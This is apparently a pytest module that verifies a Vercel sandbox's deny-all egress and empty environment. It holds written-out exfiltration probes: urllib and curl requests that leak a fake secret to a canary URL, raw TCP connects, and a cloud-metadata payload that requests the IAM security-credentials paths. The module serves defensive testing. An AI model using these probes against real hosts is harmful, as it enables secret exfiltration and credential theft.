"""The two sandbox release-gate boxes, against the REAL Vercel provider.

`plans/rebuild/05-security.md` §2 carried these two unticked, both marked "needs
Vercel credentials; owner item":

> - [ ] Hostile-payload suite green in CI against the real sandbox provider — **not run.**
>       The deny-all egress policy and empty env are asserted in CI against the *call*,
>       not against a live provider
> - [ ] Sandbox egress: canary-URL exfil attempt provably blocked (test artifact attached)

`test_hostile_payloads.py` proves everything provable without a paid provider:
the static guard, the runtime caps against the local double, and that
`_create_kwargs` always *requests* `network_policy="deny-all"`. What it cannot
prove is that the request is *honoured* — that the microVM actually refuses
egress. Only a live sandbox answers that, and this module is that run.

## The guard is bypassed here on purpose

Every test calls ``sandbox._execute(spec)`` rather than ``run(sandbox, spec)``.
That is deliberate and it is the point: layer 1 (the static guard) would reject
every payload below before a microVM existed, so testing through ``run`` would
only ever re-prove that layer 1 works. Defense in depth has to be tested one
layer at a time with the others defeated, or all you ever learn is that the
outermost layer is there.

## Three controls, because "it was blocked" is the easiest result to fake

A sandbox that never starts — wrong token, missing image, exhausted quota —
fails every hostile payload, and a suite that only asserts failure passes
brilliantly while proving nothing. So:

1. ``test_provider_is_live`` — benign code runs and returns its stdout. If this
   fails, every other result in the module is uninterpretable, not reassuring.
2. ``test_canary_records_a_request_from_a_networked_host`` — the same canary URL,
   same nonce shape, same log query, issued from the test host. This is what
   makes "zero log rows" mean *blocked* rather than *my query was wrong*.
3. ``test_mmds_carries_nothing`` — see below. It asserts an emptiness we do not
   control, so it is written to fail loudly if that ever changes.

## The canary sink is our own Cloud Run request log

No third-party canary service: the sink is `majorana-api`, which we own and whose
request log we can query. A nonce goes in the query string; Cloud Logging is then
asked whether any request carried it. `httpRequest.requestUrl` records the full
URL, so a hit is unambiguous and a miss is checkable against the control.
"""

from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
import time
import urllib.request
import uuid

import pytest

from majorana_sandbox import ExecutionSpec, VercelSandbox

# --- Gating -----------------------------------------------------------------

VERCEL_VARS = ("VERCEL_TOKEN", "VERCEL_PROJECT_ID", "VERCEL_TEAM_ID")

requires_vercel = pytest.mark.skipif(
    not all(os.environ.get(v) for v in VERCEL_VARS),
    reason=(
        "the live sandbox gate needs " + ", ".join(VERCEL_VARS) + " — "
        "scripts/run-sandbox-egress-gate.sh supplies them from Secret Manager"
    ),
)

requires_log_reader = pytest.mark.skipif(
    shutil.which("gcloud") is None,
    reason="the canary half reads the majorana-api request log via gcloud",
)

#: `asyncio_mode = "auto"` in the root pyproject, so bare `async def test_` is enough.
pytestmark = requires_vercel

CANARY_HOST = "majorana-api-nikekeixtq-uw.a.run.app"
CANARY_URL = f"https://{CANARY_HOST}/health"
GCP_PROJECT = "majorana-core"

#: Long enough for six probes with their own short timeouts, under the 120 s
#: ExecutionSpec ceiling.
PROBE_TIMEOUT_S = 120


def _nonce(kind: str) -> str:
    return f"canary-{kind}-{uuid.uuid4().hex[:16]}"


#: How long to let Cloud Logging catch up before believing an absence. Measured,
#: not guessed: the first run of this gate had the control appear only on a later
#: query, which is the whole reason `_wait_for_canary` exists.
INGEST_WAIT_S = 150
INGEST_POLL_S = 10


def _canary_hits(nonce: str) -> list[str]:
    """Rows in the majorana-api request log whose URL carries `nonce`.

    One query shape, used for both the exfil nonce and the control nonce, so the
    two results are comparable. A miss is only evidence when the same query finds
    the control.
    """
    query = (
        "resource.type=cloud_run_revision "
        "AND resource.labels.service_name=majorana-api "
        f'AND httpRequest.requestUrl:"{nonce}"'
    )
    out = subprocess.run(
        [
            "gcloud",
            "logging",
            "read",
            query,
            f"--project={GCP_PROJECT}",
            "--limit=10",
            "--freshness=2h",
            "--format=value(timestamp,httpRequest.requestUrl)",
        ],
        capture_output=True,
        text=True,
        timeout=180,
    )
    assert out.returncode == 0, f"log query failed, so its emptiness proves nothing: {out.stderr}"
    return [line for line in out.stdout.splitlines() if line.strip()]


def _hit_canary_from_here(kind: str) -> str:
    """Issue a request that certainly arrives, and return its nonce."""
    nonce = _nonce(kind)
    with urllib.request.urlopen(f"{CANARY_URL}?canary={nonce}", timeout=30) as r:
        assert r.status == 200, f"canary sink unhealthy: {r.status}"
    return nonce


def _wait_for_canary(nonce: str) -> list[str]:
    """Poll until `nonce` shows up in the request log, or give up after the budget.

    Cloud Logging ingestion is not synchronous with the request. Querying straight
    after a request can legitimately return nothing, which is fatal for a gate
    whose whole claim is that nothing was recorded — an absence measured too early
    is indistinguishable from an absence that means something.
    """
    deadline = time.monotonic() + INGEST_WAIT_S
    while True:
        hits = _canary_hits(nonce)
        if hits or time.monotonic() >= deadline:
            return hits
        time.sleep(INGEST_POLL_S)


async def _run_in_sandbox(code: str, timeout_s: int = PROBE_TIMEOUT_S):
    # _execute, not run(): the static guard is layer 1 and layer 3 is on trial.
    return await VercelSandbox()._execute(ExecutionSpec(code=code, timeout_s=timeout_s))


def _payload_json(stdout: str, marker: str) -> dict:
    m = re.search(rf"{marker}=(\{{.*\}})", stdout, re.S)
    assert m, f"payload did not emit {marker}; stdout was: {stdout[:800]!r}"
    return json.loads(m.group(1))


# --- Control 1: the provider is actually live -------------------------------


async def test_provider_is_live():
    """A benign run must succeed, or every 'blocked' below is uninterpretable.

    This is the control that stops the suite passing vacuously when the token is
    wrong, the image is missing, or the account is out of quota — all of which
    make hostile payloads 'fail' exactly as loudly as a working egress policy does.
    """
    result = await _run_in_sandbox("print('hello from the microVM')", timeout_s=60)
    assert result.ok, f"provider not live: exit={result.exit_code} stderr={result.stderr[:400]}"
    assert result.provider == "vercel"
    assert "hello from the microVM" in result.stdout


# --- Control 2: the canary sink records a request that DOES arrive ----------


@requires_log_reader
def test_canary_records_a_request_from_a_networked_host():
    """The counterexample that gives the negative result its meaning.

    Without this, `_canary_hits(exfil_nonce) == []` is equally consistent with
    "egress blocked" and "the log query is broken".
    """
    hits = _wait_for_canary(_hit_canary_from_here("control"))
    assert hits, (
        "the canary sink did not record a request that demonstrably succeeded "
        f"within {INGEST_WAIT_S}s — the log query cannot be used as evidence of a block"
    )


# --- The gate: an exfil attempt reaches nothing ------------------------------

EXFIL_PAYLOAD = r"""
import json, socket, subprocess, urllib.request

CANARY = "{canary}"
NONCE = "{nonce}"
STOLEN = "fake-secret-ABCDEF"          # stands in for a stolen credential
out = {{}}

# 1. The realistic exfil: HTTPS GET carrying the stolen value in the query string.
try:
    with urllib.request.urlopen(
        CANARY + "?canary=" + NONCE + "-urllib&leak=" + STOLEN, timeout=8
    ) as r:
        out["urllib"] = "REACHED status=" + str(r.status)
except Exception as e:
    out["urllib"] = type(e).__name__ + ": " + str(e)[:200]

# 2. DNS alone — partial egress is still egress.
try:
    out["dns"] = "RESOLVED " + str(socket.getaddrinfo("{host}", 443)[0][4])
except Exception as e:
    out["dns"] = type(e).__name__ + ": " + str(e)[:200]

# 3. Raw TCP to the canary host, under any HTTP-layer rule.
try:
    s = socket.socket(); s.settimeout(8); s.connect(("{host}", 443)); s.close()
    out["tcp_canary"] = "CONNECTED"
except Exception as e:
    out["tcp_canary"] = type(e).__name__ + ": " + str(e)[:200]

# 4. Raw TCP to a bare IP — defeats a DNS-only blocklist.
try:
    s = socket.socket(); s.settimeout(8); s.connect(("1.1.1.1", 443)); s.close()
    out["tcp_bare_ip"] = "CONNECTED"
except Exception as e:
    out["tcp_bare_ip"] = type(e).__name__ + ": " + str(e)[:200]

# 5. The default gateway the routing table names.
try:
    s = socket.socket(); s.settimeout(6); s.connect(("100.64.0.1", 443)); s.close()
    out["tcp_gateway"] = "CONNECTED"
except Exception as e:
    out["tcp_gateway"] = type(e).__name__ + ": " + str(e)[:200]

# 6. Egress that never touches Python's socket module.
try:
    p = subprocess.run(
        ["curl", "-sS", "-m", "10", "-o", "/dev/null", "-w", "%{{http_code}}",
         CANARY + "?canary=" + NONCE + "-curl&leak=" + STOLEN],
        capture_output=True, text=True, timeout=20)
    out["curl"] = "rc=" + str(p.returncode) + " out=" + p.stdout[:60] + " err=" + p.stderr[:150]
except Exception as e:
    out["curl"] = type(e).__name__ + ": " + str(e)[:200]

print("EXFIL_JSON=" + json.dumps(out))
"""


@requires_log_reader
async def test_exfil_attempt_reaches_no_canary():
    """Six egress vectors from inside a real deny-all microVM; the canary sees none.

    The vectors are chosen so that no single mechanism explains all six passing:
    HTTPS through urllib, DNS on its own, raw TCP to a name, raw TCP to a bare IP
    (which a DNS blocklist would not catch), the default gateway itself, and a
    subprocess that bypasses Python's socket module entirely.

    ## Why the control is sent *after* the attempt

    The absence of a log row is only evidence if the log is current. Ingestion is
    asynchronous, so a query issued straight after the sandbox run returns nothing
    whether egress was blocked or wide open — the first version of this test
    passed for exactly that reason, and `test_canary_records_a_request_...`
    failing is what exposed it.

    So a second nonce is sent from this host *after* the sandbox has finished
    trying, and the exfil verdict is only read once that one has landed. The
    control arriving proves the log has ingested past a moment strictly later than
    any request the sandbox could have made — which is the ordering that makes
    "the exfil nonce is absent" mean it was never sent.
    """
    nonce = _nonce("exfil")
    result = await _run_in_sandbox(
        EXFIL_PAYLOAD.format(canary=CANARY_URL, nonce=nonce, host=CANARY_HOST)
    )
    assert result.ok, f"probe did not complete: {result.stderr[:400]}"
    probes = _payload_json(result.stdout, "EXFIL_JSON")

    # Nothing may report having got through.
    reached = {k: v for k, v in probes.items() if "REACHED" in v or "CONNECTED" in v}
    assert not reached, f"egress succeeded from inside a deny-all sandbox: {reached}"

    # Establish that the log is current past the end of the sandbox run.
    tracer = _hit_canary_from_here("tracer")
    assert _wait_for_canary(tracer), (
        f"the tracer request did not land within {INGEST_WAIT_S}s, so the log is not "
        "known to be current and the exfil result below would prove nothing"
    )

    # Only now is an empty result meaningful. This is the half a client-side
    # exception cannot establish: a request can fail after being received.
    assert _canary_hits(nonce) == [], "the canary recorded a request from the sandbox"


# --- The empty env ----------------------------------------------------------


async def test_sandbox_env_carries_no_credentials():
    """`_create_kwargs` passes `env: {}`; this is that promise kept at runtime.

    `GPG_KEY` is allowed: it is the Python release signing key baked into the
    upstream python image, not a credential of ours. Asserted by name rather than
    filtered by pattern, so a second credential-shaped variable fails the test
    instead of being quietly absorbed by the exception.
    """
    code = "import json, os\nprint('ENV_JSON=' + json.dumps({'names': sorted(os.environ)}))\n"
    result = await _run_in_sandbox(code, timeout_s=60)
    assert result.ok, result.stderr[:400]
    names = _payload_json(result.stdout, "ENV_JSON")["names"]

    suspicious = [
        n
        for n in names
        if any(t in n.upper() for t in ("TOKEN", "KEY", "SECRET", "PASSWORD", "VERCEL"))
    ]
    assert suspicious == ["GPG_KEY"], f"credential-shaped variables in the sandbox: {suspicious}"


# --- The one address that answers -------------------------------------------

MMDS_PAYLOAD = r"""
import json, urllib.request, urllib.error

out = {}

def req(label, url, method="GET", headers=None):
    try:
        r = urllib.request.Request(url, method=method, headers=headers or {})
        with urllib.request.urlopen(r, timeout=6) as resp:
            body = resp.read(2000).decode("utf-8", "replace")
            out[label] = {"status": resp.status, "body": body}
            return body
    except urllib.error.HTTPError as e:
        out[label] = {"status": e.code, "body": e.read(400).decode("utf-8", "replace")}
    except Exception as e:
        out[label] = {"error": type(e).__name__ + ": " + str(e)[:200]}
    return None

# MMDSv2 exists to defeat SSRF, which cannot easily issue a PUT with a custom
# header. Code running natively in the guest can, so mint the token and look.
tok = req("token", "http://169.254.169.254/latest/api/token", method="PUT",
          headers={"X-metadata-token-ttl-seconds": "60"})
out["token_minted"] = bool(tok)
if tok:
    hdrs = {"X-metadata-token": tok, "X-aws-ec2-metadata-token": tok}
    for label, path in [
        ("root", "/"),
        ("meta_data", "/latest/meta-data"),
        ("iam", "/latest/meta-data/iam/security-credentials/"),
        ("user_data", "/latest/user-data"),
    ]:
        req(label, "http://169.254.169.254" + path, headers=hdrs)

print("MMDS_JSON=" + json.dumps(out))
"""


async def test_mmds_carries_nothing():
    """169.254.169.254 answers inside the sandbox. Assert it has nothing to give.

    Found while running this gate rather than assumed, and worth stating plainly:
    every other address tested is `No route to host`, but the Firecracker MMDS on
    the link-local address accepts connections, and a payload running natively in
    the guest **can** mint an MMDSv2 session token — the SSRF defense that makes
    V2 worth having does not apply to code already inside.

    Today the data store is empty: the root returns 200 with a zero-length body
    and every documented path 404s. So there is nothing to steal, and this is not
    a finding against the deny-all policy — MMDS is not egress, it is the
    hypervisor talking to its own guest.

    But that emptiness is Vercel's configuration choice, not ours, and nothing on
    our side would notice it changing. This test is where we would find out: it
    fails the moment MMDS starts serving content, which is the moment it becomes
    a credential surface reachable by untrusted code.
    """
    result = await _run_in_sandbox(MMDS_PAYLOAD, timeout_s=60)
    assert result.ok, result.stderr[:400]
    mmds = _payload_json(result.stdout, "MMDS_JSON")

    if not mmds.get("token_minted"):
        pytest.skip("MMDS refused a session token — nothing reachable to assert about")

    root = mmds.get("root", {})
    assert root.get("status") == 200, f"unexpected MMDS root response: {root}"
    assert root.get("body", "") == "", (
        f"MMDS is now serving content to untrusted code: {root.get('body', '')[:300]!r}"
    )
    for label in ("meta_data", "iam", "user_data"):
        entry = mmds.get(label, {})
        assert entry.get("status") == 404, f"MMDS {label} is now readable: {entry}"


if __name__ == "__main__":  # pragma: no cover - convenience for the gate script
    raise SystemExit(pytest.main([__file__, "-v", "--no-header"]))
